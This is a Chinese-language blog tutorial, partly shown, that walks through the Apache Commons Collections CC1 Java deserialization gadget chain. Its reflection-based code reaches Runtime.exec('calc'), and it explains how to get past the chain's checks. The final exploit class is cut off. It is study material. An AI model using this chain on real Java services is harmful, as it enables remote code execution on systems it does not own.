@@ -1,0 +1,429 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>java反序列化-cc1 | ke1nys`Blog</title><meta name="author" content="ke1nys"><meta name="copyright" content="ke1nys"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="我是看这个视频来进行学习的 cc1 这里的话不要跳过视频里的那个安装调试包的代码，跳过的话就会复现不了，得一步一步跟着做 这个cc1链的危险方法就是发现了Transformer接口  然后利用里面的这个transform函数  这里话就是本篇文章主要讲的地方，就是利用这个函数，来进行操作 这里面还写一个反射调用，并且里面的值还可控，这就是造成任意方法调用了，所以这就是这个链子的入口 这里的话，我们">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化-cc1">
+<meta property="og:url" content="https://ke1nys.github.io/posts/488024db.html">
+<meta property="og:site_name" content="ke1nys&#96;Blog">
+<meta property="og:description" content="我是看这个视频来进行学习的 cc1 这里的话不要跳过视频里的那个安装调试包的代码，跳过的话就会复现不了，得一步一步跟着做 这个cc1链的危险方法就是发现了Transformer接口  然后利用里面的这个transform函数  这里话就是本篇文章主要讲的地方，就是利用这个函数，来进行操作 这里面还写一个反射调用，并且里面的值还可控，这就是造成任意方法调用了，所以这就是这个链子的入口 这里的话，我们">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2023-03-16T13:57:31.000Z">
+<meta property="article:modified_time" content="2023-04-06T06:48:36.151Z">
+<meta property="article:author" content="ke1nys">
+<meta property="article:tag" content="java反序列化 cc1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/zhuzhu.png"><link rel="canonical" href="https://ke1nys.github.io/posts/488024db"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java反序列化-cc1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-04-06 14:48:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/css/runtime/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ke1nys`Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ke1nys`Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">java反序列化-cc1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-16T13:57:31.000Z" title="发表于 2023-03-16 21:57:31">2023-03-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-06T06:48:36.151Z" title="更新于 2023-04-06 14:48:36">2023-04-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="java反序列化-cc1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>我是看这个视频来进行学习的 <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p>
+<p>这里的话不要跳过视频里的那个安装调试包的代码，跳过的话就会复现不了，得一步一步跟着做</p>
+<p>这个cc1链的危险方法就是发现了Transformer接口</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230316222922808.png" alt="image-20230316222922808"></p>
+<p>然后利用里面的这个transform函数</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230316223143480.png" alt="image-20230316223143480"></p>
+<p>这里话就是本篇文章主要讲的地方，就是利用这个函数，来进行操作</p>
+<p>这里面还写一个反射调用，并且里面的值还可控，这就是造成任意方法调用了，所以这就是这个链子的入口</p>
+<p>这里的话，我们可以尝试利用这个函数来弹个计算器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230316225007753.png" alt="image-20230316225007753"></p>
+<p>这里是<code>InvokerTransformer</code>的构造函数方法，结合上面的图片，可知通过这个构造函数传参从而弹个计算器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317164525497.png" alt="image-20230317164525497"></p>
+<p>这就成功弹出了一个计算器</p>
+<p><strong>发现这里可以任意函数调用后，那么我们就得去找谁的里面调用transformer</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317165005890.png" alt="image-20230317165005890"></p>
+<p>查找后发现有21个调用，那么我们就得从里面找到一个合适的方法</p>
+<p>(得找一个不同名的函数里面时调用transformer的)</p>
+<p>然后我们就找到了这个方法是调用transformer的(是在TransformedMap类里边的)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317170511870.png" alt="image-20230317170511870"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317165356791.png" alt="image-20230317165356791"></p>
+<p>然后我们就跟进看一下<code>valueTransformer</code>是什么东西</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317165605279.png" alt="image-20230317165605279"></p>
+<p>是有一个保护的函数方法来给他赋值，那我们继续跟进，看一下咋调用这个函数方法</p>
+<p>然后就发现这里有个decorate方法调用了这个函数方法，并且还可以传值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317165703877.png" alt="image-20230317165703877"></p>
+<p>因为这个decorate里边需要传一个map类，所以我们就新建一个map类来传参。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317170703239.png" alt="image-20230317170703239"></p>
+<p>这里只要写是因为checkvalue里只用到了valuetransformer,所以keytransfomer就为null.</p>
+<p>但是这里虽然是能调用到了transfomer方法，但是checkvalue里的value不可控，所以我们就继续去找谁里面调用了checkvalue方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317171128586.png" alt="image-20230317171128586"></p>
+<p>在这里发现了一个抽象类里边的setvalue是调用这个方法的，并且我们还发现了这个抽象类是transformedMap的父类</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317171449070.png" alt="image-20230317171449070"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317171308361.png" alt="image-20230317171308361"></p>
+<p>那么我们就接着去找谁调用了setvalue方法</p>
+<p>这里话是利用MapEntry遍历来调用setvalue方法的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317172617863.png" alt="image-20230317172617863"></p>
+<p>这样写就能成功调用setvalue了</p>
+<p>首先，这里给hashmap.put(“key”,”value”)的原因是简单创建一个key值，为了下方的遍历提供内容，不写的话就不会进行for循环里的遍历</p>
+<p>这里是先for循环进行遍历，然后调用setvalue(这个时候的value值已经传进去了)里面的checkvalue,然后checkvalue就会根据传的valuetransformer进行调用transfomer.</p>
+<p>然后就会弹计算器了</p>
+<p><strong>接下来我们继续找谁调用了setvalue方法</strong></p>
+<p>这里最好的想法是直接找谁的readobject里面调用了setvalue方法，如果没找到的话就和上面一样的方法 ，看谁里面调用了setvalue方法，最后的归宿都是找readobject里面调用了xxx方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317175443088.png" alt="image-20230317175443088"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317175529057.png" alt="image-20230317175529057"></p>
+<p>在这个类里边的方法找到了调用setvalue的方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317175649684.png" alt="image-20230317175649684"></p>
+<p>并且这个memberValues可控，那么我们就可以限定调用哪个类的setvalue方法了</p>
+<p>这里有一个小问题就是这个类不是public类型，是一个default类型</p>
+<p>那么不能直接调用了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317180005106.png" alt="image-20230317180005106"></p>
+<p>必须得在这个包里才能调用了，所以这里我们就是用反射的方法进行调用了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317184552260.png" alt="image-20230317184552260"></p>
+<p>反射的方法就写好了，这里为什么能传map，是因为这个setvalue所在的类是transformedMap的父类，然后传的map是TransformerMap类创建的，所以在反序列化的时候就会调用到那个抽象类里边的setvalue方法，这里写的Override的原因是因为下图的这个构造函数里边要求的注释class</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317185333816.png" alt="image-20230317185333816"></p>
+<p>这里有个不好的点就是value没法控制，所以得想办法来传value</p>
+<p>还有就是这里的Runtime是没法进行序列化的(因为没有继承serializeble)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317194226941.png" alt="image-20230317194226941"></p>
+<p>还有就是这里的两个if也要判断绕过</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317194329316.png" alt="image-20230317194329316"></p>
+<p>所以上面一共有三个问题要进行解决</p>
+<p><strong>先解决runtime序列化问题</strong></p>
+<p>这里的话先写出反射的方法，然后在写到<code>InvokerTransformer</code>上</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317195857622.png" alt="image-20230317195857622"></p>
+<p>因为class能进行序列化，而Runtime不行，所以就使用反射来写</p>
+<p>接下来我们把这段代码与InvokerTransformer结合来写</p>
+<p>这也是个反射方法(写在函数内部的)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317202145679.png" alt="image-20230317202145679"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317202207893.png" alt="image-20230317202207893"></p>
+<p>这段代码写的有点绕，就是利用InvokerTransformer类里边transform的反射在利用一遍，就是利用反射获取到Runtime.class的getMethod方法，然后第二位置就是传参数，第三位置就是传invoke需要的东西，就是有点嵌套的感觉，慢慢看就能把这个代码看懂了</p>
+<p>就是根据，没用InvokerTransformer之前写的runtime反射代码来写，一步一步用InvokerTransformer来写反射来进行替换</p>
+<p>接下来就到替换invoke了<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317202631561.png" alt="image-20230317202631561"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(method);</span><br></pre></td></tr></table></figure>
+<p>这个和上面的第一次解释一样，也是和嵌套一样</p>
+<p>上面是到Runtime.getRuntime()了，那么我们接下来直接写”exec”直接反射调用弹计算器了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>
+<p>这句代码就没那么抽象了，不像前两个那么抽象</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317204314863.png" alt="image-20230317204314863"></p>
+<p>这就是替换掉之前写的没加InvokerTransformer的反射调用了，然后就可以弹计算器了</p>
+<p>这里还暴露了一个弊端就是老是嵌套用法，前一个调用后一个，老是调用tranformer里面的反射，所以这里就利用<code>ChainedTransformer</code>来解决这个问题</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317205703565.png" alt="image-20230317205703565"></p>
+<p>就是图片上两个函数，就是靠这两个来进行替换掉</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317210240200.png" alt="image-20230317210240200"></p>
+<p>然后就写好了这里就只有Runtime.class是我们可控的，其他只是起个变量名的作用而已</p>
+<p>解决完Runtime不能反序列化后，这里就得解决那两个if判断的问题了</p>
+<p><strong>绕过if两个判断</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317211434930.png" alt="image-20230317211434930"></p>
+<p>这里的memberValue是传进来的map，在外面已经定义好了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317214237583.png" alt="image-20230317214237583"></p>
+<p>并且已经有key值了，但是因为这里的key找的是map里的，但是找这个key值却是memberType的，就Override这个东西，这个东西是没有value()值的，所以我们就换一个注释函数</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317214436564.png" alt="image-20230317214436564"></p>
+<p>这个是有value()值的，名字也为value，所以我们就想着把<code>hashMap.put(&quot;key&quot;,&quot;aaa&quot;);</code>改为<code>hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</code>那么就能绕过判断了</p>
+<p>那么接下来就剩value的值怎么进行控制了</p>
+<p><strong>控制setvalue里的value值</strong></p>
+<p>那么我们这里就可以利用这个<code>ConstantTransformer</code>类来进行解决这个问题</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317215731924.png" alt="image-20230317215731924"></p>
+<p>就是利用这一点，不管transform传啥值，最后返回的都是固定的东西，那么我们只需要控制这个固定的东西就行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230317220314223.png" alt="image-20230317220314223"></p>
+<p>新增加这一行就解决了这个value不能控制的问题了，就是在setvalue调用到checkvalue那边的时候，然后就会调用<code>chainedTransformer.transformer</code>方法，然后因为在数组中因为有<code>ConstantTransformer(Runtime.class)</code>存在就会调用<code>ConstantTransformer.transformer</code>,然后就会返回一个Runtime.class,那么这个value就成功可控了，接下来就是循环嵌套了，名字影响不大</p>
+<p>这里不管<code>chainedTransformer.transformer</code>传进来什么value，<code>ConstantTransformer.transformer</code>都会固定返回Runtime.class</p>
+<p><strong>然后就全部跟完了</strong></p>
+<p><strong>cc1</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title 